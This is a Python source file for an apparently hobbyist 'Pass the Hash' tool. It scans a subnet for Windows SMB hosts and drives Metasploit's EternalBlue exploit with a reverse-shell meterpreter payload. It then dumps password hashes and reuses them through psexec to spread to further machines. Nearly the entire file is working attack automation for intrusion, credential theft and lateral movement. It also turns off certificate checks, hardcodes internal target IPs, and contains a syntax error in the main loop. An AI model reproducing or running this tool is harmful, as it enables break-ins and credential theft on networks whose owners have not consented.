from __future__ import print_function
import nmap
import re
import sys
import subprocess
import ssl
import time
from subprocess import call
from metasploit.msfrpc import MsfRpcClient

def header():
    print("""
      ___                     ___     
     /  /\        ___        /__/\    
    /  /::\      /  /\       \  \:\   
   /  /:/\:\    /  /:/        \__\:\  
  /  /:/~/:/   /  /:/     ___ /  /::\ 
 /__/:/ /:/   /  /::\    /__/\  /:/\:\\
 \  \:\/:/   /__/:/\:\   \  \:\/:/__\/
  \  \::/    \__\/  \:\   \  \::/     
   \  \:\         \  \:\   \  \:\     
    \  \:\         \__\/    \  \:\    
     \__\/                   \__\/ 
     
          Pass the Hash v0.1   
    """)

def mergeList(list1, list2):
    """
    MODIFIES LIST1 !!!
    """
    list1.extend(x for x in list2 if x not in list1)

def convertIpToRange(ip):
	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
	return rgx.match(ip).group() + '0-255'

def gatherHashes(blob):
    """
    Returns a list of tuples (username, userID, hash)
    """
    rgx = re.compile(r'([A-Za-z0-9]+):(\d+:)([A-Za-z0-9]+:[A-Za-z0-9]+):')
    dataGroups = []
    for r in rgx.finditer(blob):
        dataGroups.append(r.groups())
    return dataGroups

def setupRPC():
    # Setup SSL fix
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        pass
    else:
        ssl._create_default_https_context = _create_unverified_https_context
    # Create the connection to the RPC client
    client = None
    try:
        client = MsfRpcClient('password')
        return client
    except:
        print('please run msfrpc!')
        return None

def nmScan(ip):
    """
    Returns a list of dictionaries:
        { 'ip': '...', osfamily': '...', 'osgen': [...] }
    """
    targets = []
    range = convertIpToRange(ip)
    nm = nmap.PortScanner()
    print("Starting nmap scan over range: " + range + "...")
    nm.scan(hosts=range, arguments="-O -n -p445,139")
    hosts = nm.all_hosts()
	# For each running machine IP picked up by nmap
    for host in hosts:
		# If they have OS information
    	if 'osmatch' in nm[host]:
            host_obj = {'ip': host, 'osfamily': "", 'osgen': []}
			# Look through all possible OS matches
            for os in nm[host]['osmatch']:
                for c in os['osclass']:
					# If the OS family is Windows add the machine to possible targets
                    if c['osfamily'] == "Windows":
                        if len(host_obj['osfamily']) == 0:
                            host_obj['osfamily'] = c['osfamily']
                        host_obj['osgen'].append(c['osgen'])
            if host_obj['osfamily'] == "Windows":
                targets.append(host_obj)
    return targets

def passTheHash(ip, localip, hashlist, client):
    print('Attempting to access ' + str(ip) + ' with hash list...')
    exploit = client.modules.use('exploit', 'windows/smb/psexec')
    exploit['RHOST'] = ip
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = localip
    # try each of the hashes until one works
    for data in hashlist:
        exploit['SMBUser'] = data[0]
        exploit['SMBPass'] = data[2]
        print('Trying ' + data[0] + " on " + ip + '...')
        hashes = runExploit(client, exploit, payload)
        if hashes != None:
            print('Successfully accessed ' + ip)
            return hashes
    return None
    

def eternalBlue(ip, localip, client):
    print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
    # Load eternal blue exploit
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    exploit['RHOST'] = ip
    # Load the reverse_tcp shell payload
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = localip
    hashes = runExploit(client, exploit, payload)
    if hashes != None:
        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
        return hashes
    return None

def runExploit(client, exploit, payload):
    # Exploit the host
    proc = exploit.execute(payload=payload)
    jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
    print(str(proc.get('job_id')) + " - " + str(jobId))
    timeout = 50
    count = 0
    while(jobId not in client.sessions.list.keys() and count < timeout):
        time.sleep(3)
        print(client.sessions.list.keys())
        count += 1
    if count >= timeout:
        return None
    # Get the shell and run the hashdump
    shell = client.sessions.session(jobId)
    if shell == None:
        return None
    shell.runsingle('run post/windows/gather/hashdump')
    while(True):
        output = shell.read()
        if len(output) > 0:
            print(output)
        if(':::' in output):
            hashes = gatherHashes(output)
            client.sessions.session(jobId).kill()
            return hashes
    client.sessions.session(jobId).kill()
    return None

def getArgs(argv):
    if len(argv) < 4:
        print('Needs proper command line args')
        return None
    args = {}
    i = 0
    while i < len(argv):
        if argv[i] == '-t':
            args['targetIp'] = argv[i+1]
            i += 2
        elif argv[i] == '-l':
            args['localIp'] = argv[i+1]
            i += 2
        else:
            i += 1
    return args
        
def main():
    header()
    args = getArgs(sys.argv)
    if args == None:
        return
    targets = [ { 'ip': '10.202.208.174', 'osfamily': '', 'osgen': [] }, { 'ip': '10.202.208.190', 'osfamily': '', 'osgen': [] }] #nmScan(args['targetIp'])
    print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')

    client = setupRPC()
    # Try to break into machines with eternal blue
    hashes = []
    for i in range(len(targets)):
        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
        if hashData != None:
            targets.pop(i)
            hashes = hashData
            break

    if len(hashes) > 0:
        print(hashes)
        # Found access to network start spidering
        print('Starting hash passing...')
        for i in range(len(targets)):
            newHashes = passTheHash(targets[i].get('ip', args['localIp'], hashes, client)
            if newHashes != None:
                print('Adding ' + str(len(newHashes)) + ' to the hash list')
                mergeList(hashes, newHashes)
                print(hashes)
                targets.pop(i)
    else:
        print('Could not gain access to network... bye!')

if __name__ == "__main__":
    # execute only if run as a script
    main()

